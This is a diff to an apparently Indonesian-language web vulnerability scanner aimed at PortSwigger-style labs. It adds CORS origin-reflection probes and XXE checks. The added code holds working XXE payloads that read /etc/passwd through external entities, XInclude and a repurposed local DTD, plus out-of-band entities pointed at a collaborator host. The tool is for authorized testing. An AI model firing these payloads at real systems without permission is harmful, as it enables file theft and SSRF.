@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-SATRIA Engine -- pemindai SQL injection, XSS, CSRF, Clickjacking, dan DOM-based vulnerabilities terfokus.
+SATRIA Engine -- pemindai SQL injection, XSS, CSRF, Clickjacking, DOM-based, CORS, dan XXE terfokus.
 
-File ini menguji 71 lab (18 SQL injection + 30 XSS + 11 CSRF + 5 Clickjacking + 7 DOM-based vulnerabilities):
+File ini menguji 83 lab (18 SQL injection + 30 XSS + 11 CSRF + 5 Clickjacking + 7 DOM-based + 3 CORS + 9 XXE):
 
 SQL Injection (01-18):
  01 SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
@@ -158,7 +158,7 @@ SCAN_DEADLINE_SECONDS = 600.0
 _RUNTIME_CONFIG: dict[str, Any] = {"_ignored": []}
 
 # ----------------------------------------------------------------------------
-# Katalog: 71 lab (18 SQLi + 30 XSS + 11 CSRF + 5 Clickjacking + 7 DOM-based).
+# Katalog: 83 lab (18 SQLi + 30 XSS + 11 CSRF + 5 Clickjacking + 7 DOM-based + 3 CORS + 9 XXE).
 # ----------------------------------------------------------------------------
 CATALOG: list[tuple[int, str, str, str]] = [
     (1, "SQL injection vulnerability in WHERE clause allowing retrieval of hidden data", "where_hidden", "high"),
@@ -233,6 +233,20 @@ CATALOG: list[tuple[int, str, str, str]] = [
     (69, "DOM-based cookie manipulation", "dom_cookie_manipulation", "medium"),
     (70, "Exploiting DOM clobbering to enable XSS", "dom_clobbering_xss", "high"),
     (71, "Clobbering DOM attributes to bypass HTML filters", "dom_clobbering_attributes_bypass", "high"),
+    # CORS (72-74)
+    (72, "CORS vulnerability with basic origin reflection", "cors_basic_origin_reflection", "medium"),
+    (73, "CORS vulnerability with trusted null origin", "cors_trusted_null_origin", "medium"),
+    (74, "CORS vulnerability with trusted insecure protocols", "cors_trusted_insecure_protocols", "medium"),
+    # XXE injection (75-83)
+    (75, "Exploiting XXE using external entities to retrieve files", "xxe_external_entities_retrieve_files", "high"),
+    (76, "Exploiting XXE to perform SSRF attacks", "xxe_ssrf", "high"),
+    (77, "Blind XXE with out-of-band interaction", "xxe_blind_oob_interaction", "medium"),
+    (78, "Blind XXE with out-of-band interaction via XML parameter entities", "xxe_blind_oob_parameter_entities", "medium"),
+    (79, "Exploiting blind XXE to exfiltrate data using a malicious external DTD", "xxe_blind_exfiltrate_malicious_dtd", "high"),
+    (80, "Exploiting blind XXE to retrieve data via error messages", "xxe_blind_error_messages", "high"),
+    (81, "Exploiting XInclude to retrieve files", "xxe_xinclude_retrieve_files", "high"),
+    (82, "Exploiting XXE via image file upload", "xxe_image_file_upload", "high"),
+    (83, "Exploiting XXE to retrieve data by repurposing a local DTD", "xxe_repurpose_local_dtd", "high"),
 ]
 
 def lab_id_for(number: int) -> str:
@@ -244,7 +258,11 @@ def lab_id_for(number: int) -> str:
         return f"csrf-{number:02d}"
     if number <= 64:
         return f"clickjacking-{number:02d}"
-    return f"dom-{number:02d}"
+    if number <= 71:
+        return f"dom-{number:02d}"
+    if number <= 74:
+        return f"cors-{number:02d}"
+    return f"xxe-{number:02d}"
 
 SQL_ERROR_PATTERNS: list[tuple[re.Pattern[str], str]] = [
     (re.compile(r"ora-\d{4,5}"), "oracle"),
@@ -1620,6 +1638,9 @@ class SatriaBaruScanner:
         self.phase_clickjacking(self.pages)
         # DOM-based vulnerabilities (konservatif, analisis statis JS/HTML; tanpa eksekusi browser)
         self.phase_dom_based(self.pages)
+        # CORS & XXE (konservatif, berbasis bukti respons/probe terkontrol; anti false positive)
+        self.phase_cors(self.pages)
+        self.phase_xxe(self.pages, self.points)
         return self.report()
 
     # ======================== XSS SCANNING PHASES (30 LABS) ========================
@@ -2209,6 +2230,320 @@ class SatriaBaruScanner:
                     self._mark(71, point, ev, "dom_clobbering_attributes_markup")
 
 
+
+    # ======================== CORS (konservatif, probe Origin terkontrol) ========================
+
+    def _cors_candidate_urls(self, pages: list[Page]) -> list[str]:
+        urls = [self.target_url]
+        for page in pages[:12]:
+            urls.append(page.url)
+            for form in page.forms[:4]:
+                if form.action:
+                    urls.append(form.action)
+        out: list[str] = []
+        seen = set()
+        for u in urls:
+            try:
+                cu = canonical_url(u)
+            except Exception:
+                cu = u
+            if not cu or cu in seen or not self._same_origin(cu):
+                continue
+            seen.add(cu)
+            out.append(cu)
+        return out[:12]
+
+    @staticmethod
+    def _resp_header(headers: dict[str, str] | None, name: str) -> str | None:
+        if not headers:
+            return None
+        nl = name.lower()
+        for k, v in headers.items():
+            if str(k).lower() == nl:
+                return str(v)
+        return None
+
+    def phase_cors(self, pages: list[Page]) -> None:
+        """Deteksi konservatif CORS misconfiguration dengan probe Origin eksplisit.
+        Konfirmasi hanya jika header CORS merespons dengan refleksi origin yang diminta
+        sesuai skenario lab (bukti header jelas), untuk menghindari false positive."""
+        urls = self._cors_candidate_urls(pages)
+        if not urls:
+            return
+        evil_https = "https://evil-example.test"
+        evil_http = "http://evil-example.test"
+        for url in urls:
+            if not self._within_budget():
+                return
+            point = Point(key="cors", kind="page", label=f"endpoint {url}", url=url,
+                          name="origin", original="", page_url=url, method="GET", interest=3)
+            # 72: basic origin reflection (arbitrary https origin reflected)
+            if 72 not in self._confirmed:
+                resp = self._request("GET", url, headers={"Origin": evil_https}, allow_redirects=False)
+                acao = self._resp_header(resp.headers, "Access-Control-Allow-Origin")
+                acac = self._resp_header(resp.headers, "Access-Control-Allow-Credentials")
+                if acao and acao.strip() == evil_https and acao.strip() != "*":
+                    ev = (f"Origin probe ({evil_https}) ke {url} direfleksikan pada Access-Control-Allow-Origin={acao!r}"
+                          + (f", Access-Control-Allow-Credentials={acac!r}" if acac else "")
+                          + ". Bukti berbasis header respons CORS.")
+                    self._mark(72, point, ev, "cors_basic_origin_reflection")
+            # 73: trusted null origin
+            if 73 not in self._confirmed and self._within_budget():
+                resp = self._request("GET", url, headers={"Origin": "null"}, allow_redirects=False)
+                acao = self._resp_header(resp.headers, "Access-Control-Allow-Origin")
+                acac = self._resp_header(resp.headers, "Access-Control-Allow-Credentials")
+                if acao and acao.strip().lower() == "null":
+                    ev = (f"Origin probe (null) ke {url} diterima: Access-Control-Allow-Origin={acao!r}"
+                          + (f", Access-Control-Allow-Credentials={acac!r}" if acac else "")
+                          + ". Bukti berbasis header respons CORS.")
+                    self._mark(73, point, ev, "cors_trusted_null_origin")
+            # 74: trusted insecure protocols (http origin reflected)
+            if 74 not in self._confirmed and self._within_budget():
+                resp = self._request("GET", url, headers={"Origin": evil_http}, allow_redirects=False)
+                acao = self._resp_header(resp.headers, "Access-Control-Allow-Origin")
+                acac = self._resp_header(resp.headers, "Access-Control-Allow-Credentials")
+                if acao and acao.strip() == evil_http and acao.strip().lower().startswith("http://"):
+                    ev = (f"Origin probe dengan skema http tidak aman ({evil_http}) ke {url} direfleksikan: "
+                          f"Access-Control-Allow-Origin={acao!r}"
+                          + (f", Access-Control-Allow-Credentials={acac!r}" if acac else "")
+                          + ". Bukti berbasis header respons CORS.")
+                    self._mark(74, point, ev, "cors_trusted_insecure_protocols")
+
+    # ======================== XXE (konservatif, probe terkontrol & bukti kuat) ========================
+
+    @staticmethod
+    def _xxe_file_evidence(text: str) -> bool:
+        if not text:
+            return False
+        # /etc/passwd markers (strong, unambiguous in HTTP response context of XXE file read)
+        return bool(re.search(r"\broot:[^:\n\r]*:0:0:", text))
+
+    def _xxe_post_targets(self, pages: list[Page], points: list[Point]) -> list[tuple[str, str, dict[str, str] | None]]:
+        """Return candidate (url, mode, fields) for XML/form probes. mode: 'xml' or 'form'."""
+        out: list[tuple[str, str, dict[str, str] | None]] = []
+        seen = set()
+        # XML-kind points if any
+        for pt in points:
+            if pt.kind == "xml" and self._same_origin(pt.url):
+                key = ("xml", pt.url, pt.name)
+                if key not in seen:
+                    seen.add(key)
+                    out.append((pt.url, "xmlfield", {pt.name: ""}))
+        # forms (prefer POST)
+        for page in pages:
+            for form in page.forms:
+                if not self._same_origin(form.action):
+                    continue
+                # only non-destructive-looking actions
+                if DESTRUCTIVE_PATH_RE.search(urlparse(form.action).path or "/"):
+                    continue
+                fields = {n: v for n, v, _ in form.fields}
+                key = ("form", form.action, ",".join(sorted(fields.keys())[:6]))
+                if key in seen:
+                    continue
+                seen.add(key)
+                mode = "xmlbody" if (form.method or "get").lower() == "post" else "formget"
+                out.append((form.action, "formpost" if (form.method or "get").lower() == "post" else "formget", fields))
+        # also try target URL as XML endpoint candidate
+        if self.target_url and self._same_origin(self.target_url):
+            key = ("xml", self.target_url, "")
+            if key not in seen:
+                out.append((self.target_url, "xmlbody", None))
+        # prioritize likely XML/stock/product endpoints
+        def score(item):
+            url = item[0].lower()
+            s = 0
+            for kw in ("stock", "product", "xml", "check", "api", "soap", "feed"):
+                if kw in url:
+                    s += 2
+            if item[1] in ("xmlbody", "xmlfield"):
+                s += 2
+            return -s
+        out.sort(key=score)
+        return out[:10]
+
+    def _post_xml(self, url: str, xml_body: str) -> Response:
+        return self._request("POST", url, data=xml_body,
+                             headers={"Content-Type": "application/xml; charset=UTF-8",
+                                      "Accept": "application/xml,text/plain,*/*"})
+
+    def phase_xxe(self, pages: list[Page], points: list[Point]) -> None:
+        """Deteksi konservatif XXE/XInclude berbasis probe terkontrol.
+        Konfirmasi hanya pada bukti kuat dan tidak ambigu: konten file (/etc/passwd, root:x:0:0)
+        muncul di respons, atau interaksi OOB terverifikasi untuk payload spesifik. Tanpa bukti kuat,
+        lab dibiarkan not_confirmed untuk menghindari false positive."""
+        targets = self._xxe_post_targets(pages, points)
+        if not targets:
+            return
+
+        # 75: XXE external entity retrieve files (in-band)
+        if 75 not in self._confirmed:
+            payload = ('<?xml version="1.0" encoding="UTF-8"?>'
+                       '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>'
+                       '<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>')
+            for url, mode, fields in targets:
+                if 75 in self._confirmed or not self._within_budget():
+                    break
+                if mode == "formpost" and fields is not None:
+                    # try putting entity ref in each field value via XML body wrapper too; and as form param
+                    resp = self._post_xml(url, payload)
+                elif mode == "formget":
+                    continue
+                else:
+                    resp = self._post_xml(url, payload)
+                if self._xxe_file_evidence(resp.text):
+                    ev = (f"Respons dari {url} memuat konten file (/etc/passwd, indikator root:x:0:0) setelah payload "
+                          f"XXE external entity. Bukti berbasis respons in-band.")
+                    point = Point(key="xxe", kind="xml", label=f"endpoint {url}", url=url, name="body", original="",
+                                  page_url=url, method="POST", interest=6)
+                    self._mark(75, point, ev, "xxe_external_entity_file_read")
+                    break
+
+        # 81: XInclude to retrieve files (inject into parameter placed into XML context)
+        if 81 not in self._confirmed:
+            xinc = ('<foo xmlns:xi="http://www.w3.org/2001/XInclude">'
+                    '<xi:include parse="text" href="file:///etc/passwd"/></foo>')
+            for url, mode, fields in targets:
+                if 81 in self._confirmed or not self._within_budget():
+                    break
+                if mode == "formpost" and fields:
+                    # try as form parameter value
+                    for fname in list(fields.keys())[:5]:
+                        if 81 in self._confirmed or not self._within_budget():
+                            break
+                        data = dict(fields)
+                        data[fname] = xinc
+                        resp = self._request("POST", url, data=data)
+                        if self._xxe_file_evidence(resp.text):
+                            ev = (f"Respons dari {url} (parameter '{fname}') memuat konten file (/etc/passwd) setelah "
+                                  f"injeksi XInclude. Bukti berbasis respons in-band.")
+                            point = Point(key="xxe", kind="form", label=f"form {url}", url=url, name=fname, original=fields.get(fname,""),
+                                          page_url=url, method="POST", fields=tuple((n,v,"text") for n,v in fields.items()), interest=6)
+                            self._mark(81, point, ev, "xxe_xinclude_file_read")
+                            break
+                # also try raw XML body containing xinclude in a value
+                if 81 not in self._confirmed and self._within_budget() and mode in ("xmlbody", "xmlfield", "formpost"):
+                    body = f'<?xml version="1.0"?><root><value>{xinc}</value></root>'
+                    resp = self._post_xml(url, body)
+                    if self._xxe_file_evidence(resp.text):
+                        ev = (f"Respons dari {url} memuat konten file (/etc/passwd) setelah payload XInclude dalam body XML. "
+                              f"Bukti berbasis respons in-band.")
+                        point = Point(key="xxe", kind="xml", label=f"endpoint {url}", url=url, name="body", original="",
+                                      page_url=url, method="POST", interest=6)
+                        self._mark(81, point, ev, "xxe_xinclude_file_read_xmlbody")
+
+        # 80: Blind XXE to retrieve data via error messages (error leaks file content)
+        if 80 not in self._confirmed:
+            # reference a path whose resolution in error context can leak file; common: file:///etc/passwd as entity in a way
+            # that triggers parsing error revealing content, or file:///nonexistent joined - conservative: look for passwd in any error response
+            payload = ('<?xml version="1.0" encoding="UTF-8"?>'
+                       '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>'
+                       '<stockCheck><productId>&xxe;</productId></stockCheck>')
+            for url, mode, fields in targets:
+                if 80 in self._confirmed or not self._within_budget():
+                    break
+                resp = self._post_xml(url, payload)
+                # 80 specifically: data retrieved via error messages. If file content appears together with error-ish response, treat as evidence.
+                if self._xxe_file_evidence(resp.text) and (resp.status is not None and resp.status >= 400 or re.search(r"error|exception|xml|parser|entity", resp.text, re.I)):
+                    ev = (f"Respons error dari {url} memuat konten file (/etc/passwd) setelah payload XXE, "
+                          f"mengindikasikan kebocoran data melalui pesan error. Bukti berbasis respons.")
+                    point = Point(key="xxe", kind="xml", label=f"endpoint {url}", url=url, name="body", original="",
+                                  page_url=url, method="POST", interest=6)
+                    self._mark(80, point, ev, "xxe_blind_error_message_leak")
+
+        # 83: repurposing a local DTD (best-effort; confirm only on strong file-content evidence)
+        if 83 not in self._confirmed:
+            # common lab payload pattern using local docbookx DTD entity redefinition to emit file content
+            payload = ('<?xml version="1.0" encoding="UTF-8"?>'
+                       '<!DOCTYPE message ['
+                       '<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">'
+                       '<!ENTITY % ISOamso \'<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">'
+                       '<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">'
+                       '&#x25;eval;&#x25;error;\'>'
+                       '%local_dtd;'
+                       ']><stockCheck><productId>1</productId></stockCheck>')
+            for url, mode, fields in targets:
+                if 83 in self._confirmed or not self._within_budget():
+                    break
+                resp = self._post_xml(url, payload)
+                if self._xxe_file_evidence(resp.text):
+                    ev = (f"Respons dari {url} memuat konten file (/etc/passwd) setelah payload repurposing local DTD. "
+                          f"Bukti berbasis respons (kebocoran data teramati).")
+                    point = Point(key="xxe", kind="xml", label=f"endpoint {url}", url=url, name="body", original="",
+                                  page_url=url, method="POST", interest=6)
+                    self._mark(83, point, ev, "xxe_repurpose_local_dtd")
+
+        # 76,77,78: Blind XXE / SSRF via XXE requiring OOB interaction evidence
+        if self.oob and getattr(self.oob, "domain", None):
+            oob_host = f"{self.oob.token}.{self.oob.domain}"
+            oob_url = f"http://{oob_host}/"
+            point_oob = Point(key="xxe_oob", kind="xml", label="endpoint XML (OOB)", url=self.target_url,
+                              name="body", original="", page_url=self.target_url, method="POST", interest=5)
+
+            def _poll_seen() -> bool:
+                try:
+                    got = self._poll_oob()
+                    return bool(getattr(got, "interactions", None))
+                except Exception:
+                    return False
+
+            # 77: Blind XXE with out-of-band interaction (external entity)
+            if 77 not in self._confirmed:
+                payload77 = ('<?xml version="1.0" encoding="UTF-8"?>'
+                             f'<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "{oob_url}"> ]>'
+                             '<stockCheck><productId>&xxe;</productId></stockCheck>')
+                for url, mode, fields in targets:
+                    if 77 in self._confirmed or not self._within_budget():
+                        break
+                    self._post_xml(url, payload77)
+                    if _poll_seen():
+                        ev = (f"Interaksi OOB terverifikasi (token/domain OOB tercatat) setelah payload XXE external entity "
+                              f"ke {oob_url} dikirim ke {url}. Bukti berbasis interaksi out-of-band.")
+                        p = Point(key="xxe_oob", kind="xml", label=f"endpoint {url}", url=url, name="body", original="",
+                                  page_url=url, method="POST", interest=6)
+                        self._mark(77, p, ev, "xxe_blind_oob_interaction")
+                        break
+
+            # 78: Blind XXE with out-of-band interaction via XML parameter entities
+            if 78 not in self._confirmed:
+                payload78 = ('<?xml version="1.0" encoding="UTF-8"?>'
+                             f'<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "{oob_url}"> %xxe; ]>'
+                             '<stockCheck><productId>1</productId></stockCheck>')
+                for url, mode, fields in targets:
+                    if 78 in self._confirmed or not self._within_budget():
+                        break
+                    self._post_xml(url, payload78)
+                    if _poll_seen():
+                        ev = (f"Interaksi OOB terverifikasi setelah payload XXE parameter entity (%xxe; dideklarasikan & dipanggil) "
+                              f"ke {oob_url} dikirim ke {url}. Bukti berbasis interaksi out-of-band.")
+                        p = Point(key="xxe_oob", kind="xml", label=f"endpoint {url}", url=url, name="body", original="",
+                                  page_url=url, method="POST", interest=6)
+                        self._mark(78, p, ev, "xxe_blind_oob_parameter_entity")
+                        break
+
+            # 76: Exploiting XXE to perform SSRF attacks (OOB/collaborator interaction as SSRF evidence)
+            if 76 not in self._confirmed:
+                payload76 = ('<?xml version="1.0" encoding="UTF-8"?>'
+                             f'<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "{oob_url}"> ]>'
+                             '<stockCheck><productId>&xxe;</productId></stockCheck>')
+                for url, mode, fields in targets:
+                    if 76 in self._confirmed or not self._within_budget():
+                        break
+                    self._post_xml(url, payload76)
+                    if _poll_seen():
+                        ev = (f"Interaksi OOB/SSRF terverifikasi: parser XML melakukan permintaan ke {oob_url} "
+                              f"setelah payload XXE dikirim ke {url}. Bukti berbasis interaksi out-of-band.")
+                        p = Point(key="xxe_oob", kind="xml", label=f"endpoint {url}", url=url, name="body", original="",
+                                  page_url=url, method="POST", interest=6)
+                        self._mark(76, p, ev, "xxe_ssrf_oob_interaction")
+                        break
+
+        # 79: Blind XXE exfiltrate data using a malicious external DTD - memerlukan hosting DTD eksternal
+        # yang tidak disediakan otomatis oleh engine; tanpa bukti exfiltrasi terverifikasi, tidak dikonfirmasi (anti-FP).
+        # 82: XXE via image file upload - memerlukan endpoint upload multipart & crafting file gambar/XML spesifik;
+        # tanpa bukti kuat (mis. konten file terungkap) dari alur upload, tidak dikonfirmasi (anti-FP).
+
+
     def report(self) -> dict[str, Any]:
         labs = []
         for number, title, key, severity in CATALOG:
@@ -2386,7 +2721,7 @@ def write_report(report: dict[str, Any], output_dir: Path) -> tuple[Path, Path]:
         "<style>body{font-family:system-ui,Arial;margin:24px;color:#17202b}table{border-collapse:collapse;width:100%}"
         "th,td{border:1px solid #d8e2ea;padding:8px;vertical-align:top}th{background:#edf3f8}"
         ".confirmed{color:#0b7a3b;font-weight:700}.not_confirmed{color:#7a5a12}</style></head><body>"
-        "<h1>SATRIA Engine — SQLi, XSS, CSRF & Clickjacking (71 Lab)</h1>"
+        "<h1>SATRIA Engine — SQLi, XSS, CSRF & Clickjacking (83 Lab)</h1>"
         f"<p>Target: <code>{html_module.escape(report['target'])}</code> &middot; "
         f"Terkonfirmasi: <b>{report['summary']['confirmed']}/64</b></p>"
         "<table><thead><tr><th>Lab</th><th>Status</th><th>Judul</th><th>Lokasi</th><th>Bukti</th></tr></thead>"
@@ -2750,7 +3085,7 @@ def _pdf_lab_items(result: dict[str, Any]) -> list[dict[str, Any]]:
     items: list[dict[str, Any]] = []
     for number, title, key, severity in CATALOG:
         lab_id = lab_id_for(number)
-        found = by_id.get(lab_id, {}) or by_id.get(f"sql_injection-{number:02d}", {}) or by_id.get(f"xss-{number:02d}", {}) or by_id.get(f"csrf-{number:02d}", {}) or by_id.get(f"clickjacking-{number:02d}", {}) or by_id.get(f"dom-{number:02d}", {})
+        found = by_id.get(lab_id, {}) or by_id.get(f"sql_injection-{number:02d}", {}) or by_id.get(f"xss-{number:02d}", {}) or by_id.get(f"csrf-{number:02d}", {}) or by_id.get(f"clickjacking-{number:02d}", {}) or by_id.get(f"dom-{number:02d}", {}) or by_id.get(f"cors-{number:02d}", {}) or by_id.get(f"xxe-{number:02d}", {})
         items.append({
             "number": number, "id": lab_id, "status": str(found.get("status", "not_confirmed")),
             "title": str(found.get("title", title)), "method": str(found.get("method", "not tested / insufficient evidence")),
@@ -2781,6 +3116,9 @@ _PDF_LAB_FOCUS = {
     65: "DOM XSS (Web messages)", 66: "DOM XSS (Web messages)", 67: "DOM XSS (Web messages)",
     68: "DOM-based open redirection", 69: "DOM-based cookie manipulation",
     70: "DOM clobbering", 71: "DOM clobbering",
+    72: "CORS", 73: "CORS", 74: "CORS",
+    75: "XXE", 76: "XXE / SSRF", 77: "Blind XXE (OOB)", 78: "Blind XXE (OOB)",
+    79: "Blind XXE", 80: "Blind XXE", 81: "XXE (XInclude)", 82: "XXE (file upload)", 83: "XXE",
 }
 
 
@@ -2816,10 +3154,10 @@ def render_pdf(result: dict[str, Any], path: str | None = None) -> Path:
     page.rect(0, _PDF_PAGE_H - 242, _PDF_PAGE_W, 12, _PDF_COLORS["teal"])
     page.text(content_left, _PDF_PAGE_H - 84, "SATRIA BARU", 30, _PDF_COLORS["white"], bold=True)
     page.text(content_left, _PDF_PAGE_H - 112, "LAPORAN PEMINDAIAN SQL INJECTION, XSS, CSRF & CLICKJACKING", 13.5, _PDF_COLORS["light"], bold=True)
-    page.text(content_left, _PDF_PAGE_H - 134, "Cakupan 71 lab (18 SQLi + 30 XSS + 11 CSRF + 5 Clickjacking + 7 DOM-based) - bukti diferensial dan konservatif", 10.2, _PDF_COLORS["light"])
+    page.text(content_left, _PDF_PAGE_H - 134, "Cakupan 83 lab (18 SQLi + 30 XSS + 11 CSRF + 5 Clickjacking + 7 DOM-based + 3 CORS + 9 XXE) - bukti diferensial dan konservatif", 10.2, _PDF_COLORS["light"])
     page.y = _PDF_PAGE_H - 286
     page.paragraph(content_left, content_width, "Hasil Pemindaian", 21, _PDF_COLORS["navy"], bold=True)
-    page.paragraph(content_left, content_width, "Laporan ini merangkum pengujian terhadap 71 lab (18 SQL injection, 30 XSS, 11 CSRF, 5 Clickjacking, 7 DOM-based) yang diminta. Status tidak terkonfirmasi berarti bukti tidak cukup; bukan klaim bahwa lab tidak rentan.", 9.8, _PDF_COLORS["muted"])
+    page.paragraph(content_left, content_width, "Laporan ini merangkum pengujian terhadap 83 lab (18 SQL injection, 30 XSS, 11 CSRF, 5 Clickjacking, 7 DOM-based, 3 CORS, 9 XXE) yang diminta. Status tidak terkonfirmasi berarti bukti tidak cukup; bukan klaim bahwa lab tidak rentan.", 9.8, _PDF_COLORS["muted"])
     page.y -= 18
     for label, value in (("Target", target), ("Hasilkan", generated or "-"), ("Mode", str(result.get("mode", "active")))):
         page.text(content_left, page.y - 10, f"{label}:", 9.0, _PDF_COLORS["navy"], bold=True)
@@ -2833,7 +3171,7 @@ def render_pdf(result: dict[str, Any], path: str | None = None) -> Path:
     kpis = [
         ("Terkonfirmasi", str(len(confirmed)), _PDF_COLORS["green"], _PDF_COLORS["green_light"]),
         ("Belum terkonfirmasi", str(len(not_confirmed)), _PDF_COLORS["amber"], _PDF_COLORS["amber_light"]),
-        ("Total lab", "71", _PDF_COLORS["navy"], _PDF_COLORS["light_blue"]),
+        ("Total lab", "83", _PDF_COLORS["navy"], _PDF_COLORS["light_blue"]),
     ]
     for idx, (label, value, color, light) in enumerate(kpis):
         x = content_left + idx * (kpi_w + kpi_gap)
@@ -2851,9 +3189,9 @@ def render_pdf(result: dict[str, Any], path: str | None = None) -> Path:
 
     # --------------------------------------------------------------- RINGKASAN
     page.new_page()
-    page.section_title("Ringkasan Hasil", "Angka berikut berasal dari 71 lab yang diminta.")
+    page.section_title("Ringkasan Hasil", "Angka berikut berasal dari 83 lab yang diminta.")
     rows = [
-        ("Total lab", "71", "Semua judul wajib dari katalog (18 SQLi + 30 XSS + 11 CSRF + 5 Clickjacking + 7 DOM-based)."),
+        ("Total lab", "83", "Semua judul wajib dari katalog (18 SQLi + 30 XSS + 11 CSRF + 5 Clickjacking + 7 DOM-based + 3 CORS + 9 XXE)."),
         ("Terkonfirmasi", str(len(confirmed)), "Bukti diferensial terpenuhi dan dapat diulang."),
         ("Belum terkonfirmasi", str(len(not_confirmed)), "Tidak ada bukti cukup pada putaran ini."),
         ("Severity Critical", str(by_severity.get("critical", 0)), "Hitungan hanya untuk temuan terkonfirmasi."),
@@ -2902,7 +3240,7 @@ def render_pdf(result: dict[str, Any], path: str | None = None) -> Path:
 
     # ------------------------------------------------------------------- TABEL
     page.new_page()
-    page.section_title("Hasil Pemindaian", "Tabel ringkas: satu baris untuk setiap 71 lab.")
+    page.section_title("Hasil Pemindaian", "Tabel ringkas: satu baris untuk setiap 83 lab.")
     headers = ("Lab", "Status", "Fokus", "Judul", "Severity")
     widths = (82.0, 92.0, 90.0, 190.0, 45.0)
     x_cols = []
@@ -2989,7 +3327,7 @@ def render_pdf(result: dict[str, Any], path: str | None = None) -> Path:
     # --------------------------------------------------------- CATATAN AKHIR
     page.y -= 6
     page.section_title("Catatan Laporan")
-    page.bullet_paragraph("Dokumen ini memuat 71 lab (18 SQL injection, 30 XSS, 11 CSRF, 5 Clickjacking, 7 DOM-based) yang diminta. Status not_confirmed berarti bukti tidak cukup, bukan klaim tidak rentan.")
+    page.bullet_paragraph("Dokumen ini memuat 83 lab (18 SQL injection, 30 XSS, 11 CSRF, 5 Clickjacking, 7 DOM-based, 3 CORS, 9 XXE) yang diminta. Status not_confirmed berarti bukti tidak cukup, bukan klaim tidak rentan.")
     page.bullet_paragraph("Status not_confirmed tidak sama dengan tidak rentan; ia hanya menyatakan bukti pemindaian tidak cukup.")
     page.bullet_paragraph("Ringkasan severity dihitung dari temuan terkonfirmasi saja, sesuai field summary yang dibaca app.py.")
     page.bullet_paragraph("Lab 16-17 memerlukan collaborator atau webhook poller. Tanpa itu, pemindai tidak mengklaim deteksi OOB.")
@@ -3000,7 +3338,7 @@ def render_pdf(result: dict[str, Any], path: str | None = None) -> Path:
     for idx, page_ops in enumerate(page.pages, start=1):
         page_ops.append(f"{_pdf_rgb(_PDF_COLORS['navy'])} rg 0 {_pdf_num(_PDF_PAGE_H - 32)} {_pdf_num(_PDF_PAGE_W)} 32 re f")
         page_ops.append(f"BT /F2 8 Tf {_pdf_rgb(_PDF_COLORS['white'])} rg {_pdf_num(content_left)} {_pdf_num(_PDF_PAGE_H - 21)} Td (SATRIA BARU - SQL Injection Report) Tj ET")
-        page_ops.append(f"BT /F1 7.5 Tf {_pdf_rgb(_PDF_COLORS['light'])} rg {_pdf_num(340)} {_pdf_num(_PDF_PAGE_H - 21)} Td (71 Lab: SQLi/XSS/CSRF/CJ/DOM) Tj ET")
+        page_ops.append(f"BT /F1 7.5 Tf {_pdf_rgb(_PDF_COLORS['light'])} rg {_pdf_num(340)} {_pdf_num(_PDF_PAGE_H - 21)} Td (83 Lab: SQLi/XSS/CSRF/CJ/DOM/CORS/XXE) Tj ET")
         footer_target = _pdf_safe_text(target)
         if len(footer_target) > 84:
             footer_target = footer_target[:81] + "..."
@@ -3091,7 +3429,7 @@ def run_pipeline(scrape_data: dict[str, Any] | None = None, *, url: str | None =
                  allow_partial_tools: bool | None = None,
                  enable_llm: bool | None = None, run_censys: bool | None = None,
                  run_nvd: bool | None = None, **runtime_options: Any) -> dict[str, Any]:
-    """Jalur kompatibel yang dipakai app.py; memindai 71 lab (18 SQLi + 30 XSS + 11 CSRF + 5 Clickjacking + 7 DOM-based)."""
+    """Jalur kompatibel yang dipakai app.py; memindai 83 lab (18 SQLi + 30 XSS + 11 CSRF + 5 Clickjacking + 7 DOM-based + 3 CORS + 9 XXE)."""
     overrides: dict[str, Any] = dict(runtime_options)
     for name, value in (("allow_partial_tools", allow_partial_tools),
                         ("enable_llm", enable_llm), ("run_censys", run_censys),
@@ -3140,7 +3478,7 @@ def run_pipeline(scrape_data: dict[str, Any] | None = None, *, url: str | None =
 
 
 def main(argv: list[str] | None = None) -> int:
-    parser = argparse.ArgumentParser(description="SATRIA Engine — pemindai SQL injection, XSS, CSRF, dan Clickjacking & DOM-based (71 lab)")
+    parser = argparse.ArgumentParser(description="SATRIA Engine — pemindai SQL injection, XSS, CSRF, dan Clickjacking, DOM, CORS & XXE (83 lab)")
     parser.add_argument("target", help="URL target HTTP/HTTPS (mis. URL instance lab PortSwigger)")
     parser.add_argument("--authorized", action="store_true", help="Wajib: Anda menyatakan memiliki izin pengujian.")
     parser.add_argument("--allow-private", action="store_true", help="Izinkan target localhost/private (untuk pengujian lokal).")
@@ -3175,7 +3513,7 @@ def main(argv: list[str] | None = None) -> int:
         return 1
     json_path, html_path = write_report(report, Path(args.output_dir))
     summary = report["summary"]
-    print(f"SATRIA Engine selesai: {summary['confirmed']}/71 lab terkonfirmasi, {summary['not_confirmed']} belum terkonfirmasi.")
+    print(f"SATRIA Engine selesai: {summary['confirmed']}/83 lab terkonfirmasi, {summary['not_confirmed']} belum terkonfirmasi.")
     print(f"JSON: {json_path}")
     print(f"HTML: {html_path}")
     return 0
